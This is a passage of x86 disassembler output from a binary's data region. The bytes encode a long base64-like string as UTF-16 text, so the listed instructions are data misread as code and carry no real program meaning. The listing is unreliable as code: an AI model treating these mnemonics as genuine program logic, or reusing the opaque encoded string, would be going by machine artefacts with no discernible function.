  409c5d:	33 00                	xor    (%eax),%eax
  409c5f:	41                   	inc    %ecx
  409c60:	00 42 00             	add    %al,0x0(%edx)
  409c63:	79 00                	jns    0x409c65
  409c65:	69 00 6c 00 51 00    	imul   $0x51006c,(%eax),%eax
  409c6b:	63 00                	arpl   %eax,(%eax)
  409c6d:	6a 00                	push   $0x0
  409c6f:	7a 00                	jp     0x409c71
  409c71:	62 00                	bound  %eax,(%eax)
  409c73:	50                   	push   %eax
  409c74:	00 2b                	add    %ch,(%ebx)
  409c76:	00 6b 00             	add    %ch,0x0(%ebx)
  409c79:	43                   	inc    %ebx
  409c7a:	00 51 00             	add    %dl,0x0(%ecx)
  409c7d:	68 00 44 00 61       	push   $0x61004400
  409c82:	00 56 00             	add    %dl,0x0(%esi)
  409c85:	67 00 50 00          	add    %dl,0x0(%bx,%si)
  409c89:	6d                   	insl   (%dx),%es:(%edi)
  409c8a:	00 52 00             	add    %dl,0x0(%edx)
  409c8d:	78 00                	js     0x409c8f
  409c8f:	33 00                	xor    (%eax),%eax
  409c91:	31 00                	xor    %eax,(%eax)
  409c93:	39 00                	cmp    %eax,(%eax)
  409c95:	31 00                	xor    %eax,(%eax)
  409c97:	45                   	inc    %ebp
  409c98:	00 34 00             	add    %dh,(%eax,%eax,1)
  409c9b:	50                   	push   %eax
  409c9c:	00 33                	add    %dh,(%ebx)
  409c9e:	00 66 00             	add    %ah,0x0(%esi)
  409ca1:	38 00                	cmp    %al,(%eax)
  409ca3:	55                   	push   %ebp
  409ca4:	00 4b 00             	add    %cl,0x0(%ebx)
  409ca7:	33 00                	xor    (%eax),%eax
  409ca9:	71 00                	jno    0x409cab
  409cab:	6b 00 36             	imul   $0x36,(%eax),%eax
  409cae:	00 4f 00             	add    %cl,0x0(%edi)
  409cb1:	51                   	push   %ecx
  409cb2:	00 7a 00             	add    %bh,0x0(%edx)
  409cb5:	62 00                	bound  %eax,(%eax)
  409cb7:	62 00                	bound  %eax,(%eax)
  409cb9:	2b 00                	sub    (%eax),%eax
  409cbb:	50                   	push   %eax
  409cbc:	00 2f                	add    %ch,(%edi)
  409cbe:	00 58 00             	add    %bl,0x0(%eax)
  409cc1:	35 00 35 00 45       	xor    $0x45003500,%eax
  409cc6:	00 54 00 32          	add    %dl,0x32(%eax,%eax,1)
  409cca:	00 6a 00             	add    %ch,0x0(%edx)
  409ccd:	4e                   	dec    %esi
  409cce:	00 67 00             	add    %ah,0x0(%edi)
  409cd1:	70 00                	jo     0x409cd3
  409cd3:	79 00                	jns    0x409cd5
  409cd5:	56                   	push   %esi
  409cd6:	00 54 00 7a          	add    %dl,0x7a(%eax,%eax,1)
  409cda:	00 78 00             	add    %bh,0x0(%eax)
  409cdd:	42                   	inc    %edx
  409cde:	00 41 00             	add    %al,0x0(%ecx)
  409ce1:	2f                   	das
  409ce2:	00 69 00             	add    %ch,0x0(%ecx)
  409ce5:	6b 00 47             	imul   $0x47,(%eax),%eax
  409ce8:	00 39                	add    %bh,(%ecx)
  409cea:	00 54 00 41          	add    %dl,0x41(%eax,%eax,1)
  409cee:	00 6c 00 70          	add    %ch,0x70(%eax,%eax,1)
  409cf2:	00 53 00             	add    %dl,0x0(%ebx)
  409cf5:	43                   	inc    %ebx
  409cf6:	00 6f 00             	add    %ch,0x0(%edi)
  409cf9:	70 00                	jo     0x409cfb
  409cfb:	4e                   	dec    %esi
  409cfc:	00 77 00             	add    %dh,0x0(%edi)
  409cff:	54                   	push   %esp
  409d00:	00 59 00             	add    %bl,0x0(%ecx)
  409d03:	6c                   	insb   (%dx),%es:(%edi)
  409d04:	00 70 00             	add    %dh,0x0(%eax)
  409d07:	31 00                	xor    %eax,(%eax)
  409d09:	4e                   	dec    %esi
  409d0a:	00 32                	add    %dh,(%edx)
  409d0c:	00 63 00             	add    %ah,0x0(%ebx)
  409d0f:	35 00 72 00 6c       	xor    $0x6c007200,%eax
  409d14:	00 61 00             	add    %ah,0x0(%ecx)
  409d17:	73 00                	jae    0x409d19
  409d19:	68 00 31 00 7a       	push   $0x7a003100
  409d1e:	00 76 00             	add    %dh,0x0(%esi)
  409d21:	4e                   	dec    %esi
  409d22:	00 37                	add    %dh,(%edi)
  409d24:	00 78 00             	add    %bh,0x0(%eax)
  409d27:	73 00                	jae    0x409d29
  409d29:	50                   	push   %eax
  409d2a:	00 64 00 34          	add    %ah,0x34(%eax,%eax,1)
  409d2e:	00 62 00             	add    %ah,0x0(%edx)
  409d31:	37                   	aaa
  409d32:	00 2b                	add    %ch,(%ebx)
  409d34:	00 31                	add    %dh,(%ecx)
  409d36:	00 4e 00             	add    %cl,0x0(%esi)
  409d39:	4d                   	dec    %ebp
  409d3a:	00 4c 00 4e          	add    %cl,0x4e(%eax,%eax,1)
  409d3e:	00 36                	add    %dh,(%esi)
  409d40:	00 35 00 53 00 4f    	add    %dh,0x4f005300
  409d46:	00 63 00             	add    %ah,0x0(%ebx)
  409d49:	38 00                	cmp    %al,(%eax)
  409d4b:	34 00                	xor    $0x0,%al
  409d4d:	56                   	push   %esi
  409d4e:	00 76 00             	add    %dh,0x0(%esi)
  409d51:	36 00 69 00          	add    %ch,%ss:0x0(%ecx)
  409d55:	33 00                	xor    (%eax),%eax
  409d57:	73 00                	jae    0x409d59
  409d59:	6b 00 6a             	imul   $0x6a,(%eax),%eax
  409d5c:	00 75 00             	add    %dh,0x0(%ebp)
  409d5f:	37                   	aaa
  409d60:	00 50 00             	add    %dl,0x0(%eax)
  409d63:	67 00 53 00          	add    %dl,0x0(%bp,%di)
  409d67:	39 00                	cmp    %eax,(%eax)
  409d69:	51                   	push   %ecx
  409d6a:	00 34 00             	add    %dh,(%eax,%eax,1)
  409d6d:	49                   	dec    %ecx
  409d6e:	00 6b 00             	add    %ch,0x0(%ebx)
  409d71:	71 00                	jno    0x409d73
  409d73:	6a 00                	push   $0x0
  409d75:	68 00 2b 00 48       	push   $0x48002b00
  409d7a:	00 73 00             	add    %dh,0x0(%ebx)
  409d7d:	5a                   	pop    %edx
  409d7e:	00 35 00 6b 00 50    	add    %dh,0x50006b00
  409d84:	00 49 00             	add    %cl,0x0(%ecx)
  409d87:	55                   	push   %ebp
  409d88:	00 64 00 36          	add    %ah,0x36(%eax,%eax,1)
  409d8c:	00 41 00             	add    %al,0x0(%ecx)
  409d8f:	4e                   	dec    %esi
  409d90:	00 7a 00             	add    %bh,0x0(%edx)
  409d93:	71 00                	jno    0x409d95
  409d95:	52                   	push   %edx
  409d96:	00 4e 00             	add    %cl,0x0(%esi)
  409d99:	71 00                	jno    0x409d9b
  409d9b:	6b 00 62             	imul   $0x62,(%eax),%eax
  409d9e:	00 43 00             	add    %al,0x0(%ebx)
  409da1:	4a                   	dec    %edx
  409da2:	00 6a 00             	add    %ch,0x0(%edx)
  409da5:	34 00                	xor    $0x0,%al
  409da7:	4a                   	dec    %edx
  409da8:	00 4a 00             	add    %cl,0x0(%edx)
  409dab:	64 00 45 00          	add    %al,%fs:0x0(%ebp)
  409daf:	33 00                	xor    (%eax),%eax
  409db1:	6c                   	insb   (%dx),%es:(%edi)
  409db2:	00 78 00             	add    %bh,0x0(%eax)
  409db5:	75 00                	jne    0x409db7
  409db7:	70 00                	jo     0x409db9
  409db9:	2b 00                	sub    (%eax),%eax
  409dbb:	76 00                	jbe    0x409dbd
  409dbd:	36 00 53 00          	add    %dl,%ss:0x0(%ebx)
  409dc1:	7a 00                	jp     0x409dc3
  409dc3:	67 00 77 00          	add    %dh,0x0(%bx)
  409dc7:	6e                   	outsb  %ds:(%esi),(%dx)
  409dc8:	00 30                	add    %dh,(%eax)
  409dca:	00 59 00             	add    %bl,0x0(%ecx)
  409dcd:	59                   	pop    %ecx
  409dce:	00 7a 00             	add    %bh,0x0(%edx)
  409dd1:	6e                   	outsb  %ds:(%esi),(%dx)
  409dd2:	00 35 00 6e 00 66    	add    %dh,0x66006e00
  409dd8:	00 70 00             	add    %dh,0x0(%eax)
  409ddb:	66 00 74 00 33       	data16 add %dh,0x33(%eax,%eax,1)
  409de0:	00 58 00             	add    %bl,0x0(%eax)
  409de3:	31 00                	xor    %eax,(%eax)
  409de5:	41                   	inc    %ecx
  409de6:	00 61 00             	add    %ah,0x0(%ecx)
  409de9:	37                   	aaa
  409dea:	00 51 00             	add    %dl,0x0(%ecx)
  409ded:	78 00                	js     0x409def
  409def:	41                   	inc    %ecx
  409df0:	00 2f                	add    %ch,(%edi)
  409df2:	00 37                	add    %dh,(%edi)
  409df4:	00 34 00             	add    %dh,(%eax,%eax,1)
  409df7:	2b 00                	sub    (%eax),%eax
  409df9:	62 00                	bound  %eax,(%eax)
  409dfb:	66 00 51 00          	data16 add %dl,0x0(%ecx)
  409dff:	45                   	inc    %ebp
  409e00:	00 63 00             	add    %ah,0x0(%ebx)
  409e03:	41                   	inc    %ecx
  409e04:	00 35 00 6b 00 6d    	add    %dh,0x6d006b00
  409e0a:	00 6d 00             	add    %ch,0x0(%ebp)
  409e0d:	77 00                	ja     0x409e0f
  409e0f:	46                   	inc    %esi
  409e10:	00 4f 00             	add    %cl,0x0(%edi)
  409e13:	2f                   	das
  409e14:	00 6c 00 7a          	add    %ch,0x7a(%eax,%eax,1)
  409e18:	00 4b 00             	add    %cl,0x0(%ebx)
  409e1b:	35 00 37 00 69       	xor    $0x69003700,%eax
  409e20:	00 6a 00             	add    %ch,0x0(%edx)
  409e23:	55                   	push   %ebp
  409e24:	00 66 00             	add    %ah,0x0(%esi)
  409e27:	66 00 4d 00          	data16 add %cl,0x0(%ebp)
  409e2b:	53                   	push   %ebx
  409e2c:	00 69 00             	add    %ch,0x0(%ecx)
  409e2f:	49                   	dec    %ecx
  409e30:	00 69 00             	add    %ch,0x0(%ecx)
  409e33:	52                   	push   %edx
  409e34:	00 50 00             	add    %dl,0x0(%eax)
  409e37:	77 00                	ja     0x409e39
  409e39:	75 00                	jne    0x409e3b
  409e3b:	7a 00                	jp     0x409e3d
  409e3d:	6d                   	insl   (%dx),%es:(%edi)
  409e3e:	00 74 00 77          	add    %dh,0x77(%eax,%eax,1)
  409e42:	00 38                	add    %bh,(%eax)
  409e44:	00 59 00             	add    %bl,0x0(%ecx)
  409e47:	6b 00 6a             	imul   $0x6a,(%eax),%eax
  409e4a:	00 46 00             	add    %al,0x0(%esi)
  409e4d:	71 00                	jno    0x409e4f
  409e4f:	30 00                	xor    %al,(%eax)
  409e51:	52                   	push   %edx
  409e52:	00 37                	add    %dh,(%edi)
  409e54:	00 63 00             	add    %ah,0x0(%ebx)
  409e57:	76 00                	jbe    0x409e59
  409e59:	62 00                	bound  %eax,(%eax)
  409e5b:	71 00                	jno    0x409e5d
  409e5d:	6f                   	outsl  %ds:(%esi),(%dx)
  409e5e:	00 47 00             	add    %al,0x0(%edi)
  409e61:	4a                   	dec    %edx
  409e62:	00 2f                	add    %ch,(%edi)
  409e64:	00 68 00             	add    %ch,0x0(%eax)
  409e67:	4e                   	dec    %esi
  409e68:	00 42 00             	add    %al,0x0(%edx)
  409e6b:	49                   	dec    %ecx
  409e6c:	00 75 00             	add    %dh,0x0(%ebp)
  409e6f:	32 00                	xor    (%eax),%al
  409e71:	68 00 55 00 75       	push   $0x75005500
  409e76:	00 50 00             	add    %dl,0x0(%eax)
  409e79:	70 00                	jo     0x409e7b
  409e7b:	50                   	push   %eax
  409e7c:	00 6d 00             	add    %ch,0x0(%ebp)
  409e7f:	42                   	inc    %edx
  409e80:	00 51 00             	add    %dl,0x0(%ecx)
  409e83:	30 00                	xor    %al,(%eax)
  409e85:	6c                   	insb   (%dx),%es:(%edi)
  409e86:	00 35 00 47 00 54    	add    %dh,0x54004700
  409e8c:	00 63 00             	add    %ah,0x0(%ebx)
  409e8f:	6b 00 42             	imul   $0x42,(%eax),%eax
  409e92:	00 34 00             	add    %dh,(%eax,%eax,1)
  409e95:	66 00 41 00          	data16 add %al,0x0(%ecx)
  409e99:	61                   	popa
  409e9a:	00 42 00             	add    %al,0x0(%edx)
  409e9d:	42                   	inc    %edx
  409e9e:	00 6c 00 6d          	add    %ch,0x6d(%eax,%eax,1)
  409ea2:	00 31                	add    %dh,(%ecx)
  409ea4:	00 43 00             	add    %al,0x0(%ebx)
  409ea7:	52                   	push   %edx
  409ea8:	00 57 00             	add    %dl,0x0(%edi)
  409eab:	62 00                	bound  %eax,(%eax)
  409ead:	50                   	push   %eax
  409eae:	00 79 00             	add    %bh,0x0(%ecx)
  409eb1:	31 00                	xor    %eax,(%eax)
  409eb3:	41                   	inc    %ecx
  409eb4:	00 67 00             	add    %ah,0x0(%edi)
  409eb7:	76 00                	jbe    0x409eb9
  409eb9:	6e                   	outsb  %ds:(%esi),(%dx)
  409eba:	00 55 00             	add    %dl,0x0(%ebp)
  409ebd:	72 00                	jb     0x409ebf
  409ebf:	61                   	popa
  409ec0:	00 6b 00             	add    %ch,0x0(%ebx)
  409ec3:	56                   	push   %esi
  409ec4:	00 53 00             	add    %dl,0x0(%ebx)
  409ec7:	37                   	aaa
  409ec8:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
  409ecc:	00 72 00             	add    %dh,0x0(%edx)
  409ecf:	74 00                	je     0x409ed1
  409ed1:	48                   	dec    %eax
  409ed2:	00 61 00             	add    %ah,0x0(%ecx)
  409ed5:	51                   	push   %ecx
  409ed6:	00 31                	add    %dh,(%ecx)
  409ed8:	00 45 00             	add    %al,0x0(%ebp)
  409edb:	79 00                	jns    0x409edd
  409edd:	42                   	inc    %edx
  409ede:	00 4f 00             	add    %cl,0x0(%edi)
  409ee1:	64 00 38             	add    %bh,%fs:(%eax)
  409ee4:	00 68 00             	add    %ch,0x0(%eax)
  409ee7:	78 00                	js     0x409ee9
  409ee9:	4c                   	dec    %esp
  409eea:	00 76 00             	add    %dh,0x0(%esi)
  409eed:	6a 00                	push   $0x0
  409eef:	4e                   	dec    %esi
  409ef0:	00 6a 00             	add    %ch,0x0(%edx)
  409ef3:	72 00                	jb     0x409ef5
  409ef5:	45                   	inc    %ebp
  409ef6:	00 39                	add    %bh,(%ecx)
  409ef8:	00 44 00 31          	add    %al,0x31(%eax,%eax,1)
  409efc:	00 5a 00             	add    %bl,0x0(%edx)
  409eff:	6f                   	outsl  %ds:(%esi),(%dx)
  409f00:	00 36                	add    %dh,(%esi)
  409f02:	00 70 00             	add    %dh,0x0(%eax)
  409f05:	58                   	pop    %eax
  409f06:	00 51 00             	add    %dl,0x0(%ecx)
  409f09:	63 00                	arpl   %eax,(%eax)
  409f0b:	6c                   	insb   (%dx),%es:(%edi)
  409f0c:	00 4f 00             	add    %cl,0x0(%edi)
  409f0f:	2f                   	das
  409f10:	00 63 00             	add    %ah,0x0(%ebx)
  409f13:	33 00                	xor    (%eax),%eax
  409f15:	31 00                	xor    %eax,(%eax)
  409f17:	50                   	push   %eax
  409f18:	00 54 00 51          	add    %dl,0x51(%eax,%eax,1)
  409f1c:	00 46 00             	add    %al,0x0(%esi)
  409f1f:	59                   	pop    %ecx
  409f20:	00 67 00             	add    %ah,0x0(%edi)
  409f23:	7a 00                	jp     0x409f25
  409f25:	33 00                	xor    (%eax),%eax
  409f27:	75 00                	jne    0x409f29
  409f29:	68 00 36 00 4c       	push   $0x4c003600
  409f2e:	00 6c 00 51          	add    %ch,0x51(%eax,%eax,1)
  409f32:	00 51 00             	add    %dl,0x0(%ecx)
  409f35:	61                   	popa
  409f36:	00 51 00             	add    %dl,0x0(%ecx)
  409f39:	43                   	inc    %ebx
  409f3a:	00 5a 00             	add    %bl,0x0(%edx)
  409f3d:	2f                   	das
  409f3e:	00 4b 00             	add    %cl,0x0(%ebx)
  409f41:	55                   	push   %ebp
  409f42:	00 47 00             	add    %al,0x0(%edi)
  409f45:	73 00                	jae    0x409f47
  409f47:	41                   	inc    %ecx
  409f48:	00 64 00 51          	add    %ah,0x51(%eax,%eax,1)
  409f4c:	00 34 00             	add    %dh,(%eax,%eax,1)
  409f4f:	38 00                	cmp    %al,(%eax)
  409f51:	6e                   	outsb  %ds:(%esi),(%dx)
  409f52:	00 63 00             	add    %ah,0x0(%ebx)
  409f55:	49                   	dec    %ecx
  409f56:	00 41 00             	add    %al,0x0(%ecx)
  409f59:	51                   	push   %ecx
  409f5a:	00 70 00             	add    %dh,0x0(%eax)
  409f5d:	70 00                	jo     0x409f5f
  409f5f:	6d                   	insl   (%dx),%es:(%edi)
  409f60:	00 75 00             	add    %dh,0x0(%ebp)
  409f63:	56                   	push   %esi
  409f64:	00 32                	add    %dh,(%edx)
  409f66:	00 4c 00 74          	add    %cl,0x74(%eax,%eax,1)
  409f6a:	00 36                	add    %dh,(%esi)
  409f6c:	00 67 00             	add    %ah,0x0(%edi)
  409f6f:	79 00                	jns    0x409f71
  409f71:	65 00 39             	add    %bh,%gs:(%ecx)
  409f74:	00 54 00 44          	add    %dl,0x44(%eax,%eax,1)
  409f78:	00 5a 00             	add    %bl,0x0(%edx)
  409f7b:	66 00 45 00          	data16 add %al,0x0(%ebp)
  409f7f:	38 00                	cmp    %al,(%eax)
  409f81:	36 00 70 00          	add    %dh,%ss:0x0(%eax)
  409f85:	69 00 42 00 44 00    	imul   $0x440042,(%eax),%eax
  409f8b:	33 00                	xor    (%eax),%eax
  409f8d:	52                   	push   %edx
  409f8e:	00 6e 00             	add    %ch,0x0(%esi)
  409f91:	4a                   	dec    %edx
  409f92:	00 58 00             	add    %bl,0x0(%eax)
  409f95:	5a                   	pop    %edx
  409f96:	00 2f                	add    %ch,(%edi)
  409f98:	00 54 00 52          	add    %dl,0x52(%eax,%eax,1)
  409f9c:	00 6c 00 76          	add    %ch,0x76(%eax,%eax,1)
  409fa0:	00 6b 00             	add    %ch,0x0(%ebx)
  409fa3:	76 00                	jbe    0x409fa5
  409fa5:	39 00                	cmp    %eax,(%eax)
  409fa7:	2f                   	das
  409fa8:	00 4c 00 70          	add    %cl,0x70(%eax,%eax,1)
  409fac:	00 49 00             	add    %cl,0x0(%ecx)
  409faf:	30 00                	xor    %al,(%eax)
  409fb1:	59                   	pop    %ecx
  409fb2:	00 31                	add    %dh,(%ecx)
  409fb4:	00 76 00             	add    %dh,0x0(%esi)
  409fb7:	47                   	inc    %edi
  409fb8:	00 61 00             	add    %ah,0x0(%ecx)
  409fbb:	59                   	pop    %ecx
  409fbc:	00 72 00             	add    %dh,0x0(%edx)
  409fbf:	6d                   	insl   (%dx),%es:(%edi)
  409fc0:	00 2b                	add    %ch,(%ebx)
  409fc2:	00 71 00             	add    %dh,0x0(%ecx)
  409fc5:	38 00                	cmp    %al,(%eax)
  409fc7:	71 00                	jno    0x409fc9
  409fc9:	4c                   	dec    %esp
  409fca:	00 6a 00             	add    %ch,0x0(%edx)
  409fcd:	58                   	pop    %eax
  409fce:	00 32                	add    %dh,(%edx)
  409fd0:	00 76 00             	add    %dh,0x0(%esi)
  409fd3:	43                   	inc    %ebx
  409fd4:	00 7a 00             	add    %bh,0x0(%edx)
  409fd7:	52                   	push   %edx
  409fd8:	00 58 00             	add    %bl,0x0(%eax)
  409fdb:	51                   	push   %ecx
  409fdc:	00 78 00             	add    %bh,0x0(%eax)
  409fdf:	53                   	push   %ebx
  409fe0:	00 43 00             	add    %al,0x0(%ebx)
  409fe3:	31 00                	xor    %eax,(%eax)
  409fe5:	70 00                	jo     0x409fe7
  409fe7:	55                   	push   %ebp
  409fe8:	00 55 00             	add    %dl,0x0(%ebp)
  409feb:	6c                   	insb   (%dx),%es:(%edi)
  409fec:	00 6a 00             	add    %ch,0x0(%edx)
  409fef:	42                   	inc    %edx
  409ff0:	00 38                	add    %bh,(%eax)
  409ff2:	00 46 00             	add    %al,0x0(%esi)
  409ff5:	75 00                	jne    0x409ff7
  409ff7:	4b                   	dec    %ebx
  409ff8:	00 41 00             	add    %al,0x0(%ecx)
  409ffb:	56                   	push   %esi
  409ffc:	00 4f 00             	add    %cl,0x0(%edi)
  409fff:	54                   	push   %esp
  40a000:	00 59 00             	add    %bl,0x0(%ecx)
  40a003:	6b 00 31             	imul   $0x31,(%eax),%eax
  40a006:	00 70 00             	add    %dh,0x0(%eax)
  40a009:	34 00                	xor    $0x0,%al
  40a00b:	73 00                	jae    0x40a00d
  40a00d:	53                   	push   %ebx
  40a00e:	00 30                	add    %dh,(%eax)
  40a010:	00 53 00             	add    %dl,0x0(%ebx)
  40a013:	37                   	aaa
  40a014:	00 65 00             	add    %ah,0x0(%ebp)
  40a017:	48                   	dec    %eax
  40a018:	00 6d 00             	add    %ch,0x0(%ebp)
  40a01b:	69 00 41 00 4f 00    	imul   $0x4f0041,(%eax),%eax
  40a021:	6c                   	insb   (%dx),%es:(%edi)
  40a022:	00 4b 00             	add    %cl,0x0(%ebx)
  40a025:	48                   	dec    %eax
  40a026:	00 4e 00             	add    %cl,0x0(%esi)
  40a029:	32 00                	xor    (%eax),%al
  40a02b:	54                   	push   %esp
  40a02c:	00 77 00             	add    %dh,0x0(%edi)
  40a02f:	32 00                	xor    (%eax),%al
  40a031:	64 00 32             	add    %dh,%fs:(%edx)
  40a034:	00 38                	add    %bh,(%eax)
  40a036:	00 54 00 31          	add    %dl,0x31(%eax,%eax,1)
  40a03a:	00 66 00             	add    %ah,0x0(%esi)
  40a03d:	31 00                	xor    %eax,(%eax)
  40a03f:	65 00 52 00          	add    %dl,%gs:0x0(%edx)
  40a043:	4b                   	dec    %ebx
  40a044:	00 52 00             	add    %dl,0x0(%edx)
  40a047:	75 00                	jne    0x40a049
  40a049:	4a                   	dec    %edx
  40a04a:	00 63 00             	add    %ah,0x0(%ebx)
  40a04d:	54                   	push   %esp
  40a04e:	00 6e 00             	add    %ch,0x0(%esi)
  40a051:	79 00                	jns    0x40a053
  40a053:	67 00 61 00          	add    %ah,0x0(%bx,%di)
  40a057:	69 00 34 00 69 00    	imul   $0x690034,(%eax),%eax
  40a05d:	62 00                	bound  %eax,(%eax)
  40a05f:	51                   	push   %ecx
  40a060:	00 36                	add    %dh,(%esi)
  40a062:	00 54 00 56          	add    %dl,0x56(%eax,%eax,1)
  40a066:	00 37                	add    %dh,(%edi)
  40a068:	00 42 00             	add    %al,0x0(%edx)
  40a06b:	7a 00                	jp     0x40a06d
  40a06d:	59                   	pop    %ecx
  40a06e:	00 42 00             	add    %al,0x0(%edx)
  40a071:	41                   	inc    %ecx
  40a072:	00 76 00             	add    %dh,0x0(%esi)
  40a075:	79 00                	jns    0x40a077
  40a077:	34 00                	xor    $0x0,%al
  40a079:	52                   	push   %edx
  40a07a:	00 6b 00             	add    %ch,0x0(%ebx)
  40a07d:	42                   	inc    %edx
  40a07e:	00 32                	add    %dh,(%edx)
  40a080:	00 62 00             	add    %ah,0x0(%edx)
  40a083:	4a                   	dec    %edx
  40a084:	00 33                	add    %dh,(%ebx)
  40a086:	00 73 00             	add    %dh,0x0(%ebx)
  40a089:	54                   	push   %esp
  40a08a:	00 65 00             	add    %ah,0x0(%ebp)
  40a08d:	73 00                	jae    0x40a08f
  40a08f:	43                   	inc    %ebx
  40a090:	00 45 00             	add    %al,0x0(%ebp)
  40a093:	50                   	push   %eax
  40a094:	00 63 00             	add    %ah,0x0(%ebx)
  40a097:	64 00 4f 00          	add    %cl,%fs:0x0(%edi)
  40a09b:	78 00                	js     0x40a09d
  40a09d:	65 00 44 00 61       	add    %al,%gs:0x61(%eax,%eax,1)
  40a0a2:	00 4b 00             	add    %cl,0x0(%ebx)
  40a0a5:	47                   	inc    %edi
  40a0a6:	00 45 00             	add    %al,0x0(%ebp)
  40a0a9:	32 00                	xor    (%eax),%al
  40a0ab:	39 00                	cmp    %eax,(%eax)
  40a0ad:	4d                   	dec    %ebp
  40a0ae:	00 51 00             	add    %dl,0x0(%ecx)
  40a0b1:	52                   	push   %edx
  40a0b2:	00 65 00             	add    %ah,0x0(%ebp)
  40a0b5:	55                   	push   %ebp
  40a0b6:	00 41 00             	add    %al,0x0(%ecx)
  40a0b9:	68 00 36 00 44       	push   $0x44003600
  40a0be:	00 4d 00             	add    %cl,0x0(%ebp)
  40a0c1:	44                   	inc    %esp
  40a0c2:	00 53 00             	add    %dl,0x0(%ebx)
  40a0c5:	59                   	pop    %ecx
  40a0c6:	00 37                	add    %dh,(%edi)
  40a0c8:	00 4b 00             	add    %cl,0x0(%ebx)
  40a0cb:	36 00 58 00          	add    %bl,%ss:0x0(%eax)
  40a0cf:	52                   	push   %edx
  40a0d0:	00 48 00             	add    %cl,0x0(%eax)
  40a0d3:	7a 00                	jp     0x40a0d5
  40a0d5:	45                   	inc    %ebp
  40a0d6:	00 6f 00             	add    %ch,0x0(%edi)
  40a0d9:	71 00                	jno    0x40a0db
  40a0db:	6b 00 56             	imul   $0x56,(%eax),%eax
  40a0de:	00 79 00             	add    %bh,0x0(%ecx)
  40a0e1:	55                   	push   %ebp
  40a0e2:	00 74 00 54          	add    %dh,0x54(%eax,%eax,1)
  40a0e6:	00 78 00             	add    %bh,0x0(%eax)
  40a0e9:	58                   	pop    %eax
  40a0ea:	00 58 00             	add    %bl,0x0(%eax)
  40a0ed:	6e                   	outsb  %ds:(%esi),(%dx)
  40a0ee:	00 52 00             	add    %dl,0x0(%edx)
  40a0f1:	53                   	push   %ebx
  40a0f2:	00 54 00 63          	add    %dl,0x63(%eax,%eax,1)
  40a0f6:	00 67 00             	add    %ah,0x0(%edi)
  40a0f9:	57                   	push   %edi
  40a0fa:	00 74 00 55          	add    %dh,0x55(%eax,%eax,1)
  40a0fe:	00 56 00             	add    %dl,0x0(%esi)
  40a101:	6a 00                	push   $0x0
  40a103:	42                   	inc    %edx
  40a104:	00 66 00             	add    %ah,0x0(%esi)
  40a107:	75 00                	jne    0x40a109
  40a109:	70 00                	jo     0x40a10b
  40a10b:	4e                   	dec    %esi
  40a10c:	00 74 00 54          	add    %dh,0x54(%eax,%eax,1)
  40a110:	00 77 00             	add    %dh,0x0(%edi)
  40a113:	79 00                	jns    0x40a115
  40a115:	36 00 4b 00          	add    %cl,%ss:0x0(%ebx)
  40a119:	67 00 6d 00          	add    %ch,0x0(%di)
  40a11d:	62 00                	bound  %eax,(%eax)
  40a11f:	76 00                	jbe    0x40a121
  40a121:	6f                   	outsl  %ds:(%esi),(%dx)
  40a122:	00 4d 00             	add    %cl,0x0(%ebp)
  40a125:	47                   	inc    %edi
  40a126:	00 35 00 30 00 76    	add    %dh,0x76003000
  40a12c:	00 32                	add    %dh,(%edx)
  40a12e:	00 7a 00             	add    %bh,0x0(%edx)
  40a131:	59                   	pop    %ecx
  40a132:	00 53 00             	add    %dl,0x0(%ebx)
  40a135:	4d                   	dec    %ebp
  40a136:	00 79 00             	add    %bh,0x0(%ecx)
  40a139:	6c                   	insb   (%dx),%es:(%edi)
  40a13a:	00 6e 00             	add    %ch,0x0(%esi)
  40a13d:	7a 00                	jp     0x40a13f
  40a13f:	68 00 42 00 4f       	push   $0x4f004200
  40a144:	00 46 00             	add    %al,0x0(%esi)
  40a147:	6b 00 35             	imul   $0x35,(%eax),%eax
  40a14a:	00 76 00             	add    %dh,0x0(%esi)
  40a14d:	74 00                	je     0x40a14f
  40a14f:	49                   	dec    %ecx
  40a150:	00 57 00             	add    %dl,0x0(%edi)
  40a153:	4b                   	dec    %ebx
  40a154:	00 41 00             	add    %al,0x0(%ecx)
  40a157:	4c                   	dec    %esp
  40a158:	00 66 00             	add    %ah,0x0(%esi)
  40a15b:	5a                   	pop    %edx
  40a15c:	00 4f 00             	add    %cl,0x0(%edi)
  40a15f:	55                   	push   %ebp
  40a160:	00 42 00             	add    %al,0x0(%edx)
  40a163:	4c                   	dec    %esp
  40a164:	00 30                	add    %dh,(%eax)
  40a166:	00 71 00             	add    %dh,0x0(%ecx)
  40a169:	73 00                	jae    0x40a16b
  40a16b:	53                   	push   %ebx
  40a16c:	00 36                	add    %dh,(%esi)
  40a16e:	00 32                	add    %dh,(%edx)
  40a170:	00 6c 00 57          	add    %ch,0x57(%eax,%eax,1)
  40a174:	00 6c 00 49          	add    %ch,0x49(%eax,%eax,1)
  40a178:	00 6b 00             	add    %ch,0x0(%ebx)
  40a17b:	67 00 64 00          	add    %ah,0x0(%si)
  40a17f:	73 00                	jae    0x40a181
  40a181:	44                   	inc    %esp
  40a182:	00 75 00             	add    %dh,0x0(%ebp)
  40a185:	33 00                	xor    (%eax),%eax
  40a187:	36 00 67 00          	add    %ah,%ss:0x0(%edi)
  40a18b:	61                   	popa
  40a18c:	00 57 00             	add    %dl,0x0(%edi)
  40a18f:	49                   	dec    %ecx
  40a190:	00 2f                	add    %ch,(%edi)
  40a192:	00 62 00             	add    %ah,0x0(%edx)
  40a195:	44                   	inc    %esp
  40a196:	00 4b 00             	add    %cl,0x0(%ebx)
  40a199:	50                   	push   %eax
  40a19a:	00 46 00             	add    %al,0x0(%esi)
  40a19d:	2b 00                	sub    (%eax),%eax
  40a19f:	6f                   	outsl  %ds:(%esi),(%dx)
  40a1a0:	00 42 00             	add    %al,0x0(%edx)
  40a1a3:	6f                   	outsl  %ds:(%esi),(%dx)
  40a1a4:	00 6c 00 47          	add    %ch,0x47(%eax,%eax,1)
  40a1a8:	00 55 00             	add    %dl,0x0(%ebp)
  40a1ab:	2b 00                	sub    (%eax),%eax
  40a1ad:	2f                   	das
  40a1ae:	00 65 00             	add    %ah,0x0(%ebp)
  40a1b1:	31 00                	xor    %eax,(%eax)
  40a1b3:	61                   	popa
  40a1b4:	00 4e 00             	add    %cl,0x0(%esi)
  40a1b7:	33 00                	xor    (%eax),%eax
  40a1b9:	73 00                	jae    0x40a1bb
  40a1bb:	47                   	inc    %edi
  40a1bc:	00 67 00             	add    %ah,0x0(%edi)
  40a1bf:	32 00                	xor    (%eax),%al
  40a1c1:	43                   	inc    %ebx
  40a1c2:	00 5a 00             	add    %bl,0x0(%edx)
